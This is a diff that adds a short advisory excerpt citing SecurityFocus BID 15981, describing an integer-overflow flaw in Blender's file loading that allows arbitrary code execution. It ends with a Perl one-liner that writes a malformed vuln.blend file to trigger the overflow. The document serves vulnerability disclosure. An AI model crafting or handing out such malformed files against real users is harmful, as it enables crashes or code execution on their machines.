@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/15981/info
+
+Blender is susceptible to an integer-overflow vulnerability. This issue is due to the application's failure to properly sanitize user-supplied input before using it in a memory allocation and copy operation.
+
+This issue allows attackers to execute arbitrary machine code in the context of the user running the affected application. 
+
+perl -e 'print "BLENDER_v273"; print "\xf0\xff\xff\xff"x10' > vuln.blend
